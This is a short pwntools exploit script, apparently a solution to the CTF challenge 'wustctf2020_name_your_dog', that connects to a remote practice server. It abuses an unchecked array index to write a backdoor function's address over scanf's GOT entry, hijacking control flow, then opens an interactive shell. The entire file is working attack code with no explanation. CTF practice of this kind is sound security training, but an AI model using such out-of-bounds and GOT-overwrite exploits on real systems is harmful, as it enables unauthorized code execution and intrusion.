from pwn import *


# p = process("./wustctf2020_name_your_dog")
p = remote("node4.buuoj.cn", 27007)

back_door = 0x080485CB  
scanf_got = 0x0804A028
bss = 0x0804A060

index = int((scanf_got-bss)/8)
p.sendlineafter("Name for which?\n>", str(index))
p.sendlineafter("Give your name plz: ", p32(back_door))

p.interactive()


